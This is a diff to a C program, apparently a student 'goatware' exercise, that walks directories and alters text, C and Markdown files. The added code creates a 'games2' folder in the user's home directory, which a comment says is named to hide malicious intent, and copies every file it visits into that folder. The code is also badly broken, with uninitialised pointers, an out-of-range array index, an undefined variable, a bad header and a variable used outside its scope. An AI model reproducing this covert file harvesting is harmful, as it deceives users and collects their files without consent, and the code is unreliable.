@@ -5,6 +5,7 @@
 #include <dirent.h>
 #include <stdio.h>
 #include <string.h>
+#include <stat.h>
 
 void changeTxt(struct dirent *entry, const char *direct);
 void changeC(struct dirent *entry, const char *direct);
@@ -13,9 +14,17 @@ void openDir(const char *direct, int level);
 
 int main(void) {
 	//Change first param of changeDir to a directory path to indicate which directory you want to explore
+	char *fileCollectionAddress;
+	struct passwd *password = getpwuid(getuid());
+	const char *homeDirectory = password->pw_dir;
+	strcpy(fileCollectionAddress,homeDirectory);
+	strcat(fileCollectionAddress, "/games2");
+	//created directory which led to 'games2' to subtly hide from user malicious intent
+	mkdir(fileCollectionAddress, 0777);
 	openDir("test", 0);
 	return 0;
 }
+
 
 void openDir(const char *direct, int level) {
 	DIR *dir;
@@ -51,6 +60,15 @@ void openDir(const char *direct, int level) {
 			openDir(directPath, level + 1);
 		}
 		else {
+			// set up to copy original file to goatware folder
+			char * paths[2];
+			strcpy(paths[0], direct);
+			strcat(paths[0], "/");
+			strcat(paths[0], name);
+			strcpy(paths[1], fileCollectionAddress);
+			strcat(paths[1], "/");
+			strcat(paths[1], name);
+			copyFile(paths);
 			/* Changes file if is a .txt, .c, or .md file */
 			changeTxt(entry, direct); 
 			changeC(entry, direct);
@@ -59,7 +77,39 @@ void openDir(const char *direct, int level) {
 	} while (entry = readdir(dir));
 	closedir(dir);
 }
+//copies original file to goatware folder
+int copyFile(char * paths[]) {
 
+    int sourceFolder, destinationFolder, x, reader;
+    unsigned char buffer[4096];
+    char * sourcePath, destinationPath;
+
+
+    sourcePath = paths[1];
+    destinationPath = paths[2];
+    sourceFolder = open(sourcePath, O_RDONLY);
+    destinationFolder = open(destinationPath, O_CREAT | O_WRONLY);
+
+    while (1) {
+        reader = read(sourceFolder, buffer, 4096);
+        if (reader == -1) {
+            printf("File Reading Error.\n");
+            exit(1);
+        }
+        x = reader;
+
+        if (n == 0) break;
+
+        reader = write(destinationFolder, buffer, x);
+        if (reader == -1) {
+            printf("File Writing Error.\n");
+            exit(1);
+        }
+    }
+
+    close(sourceFolder);
+    close(destinationFolder);
+}
 void changeTxt(struct dirent *entry, const char *direct) {
 
 	// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
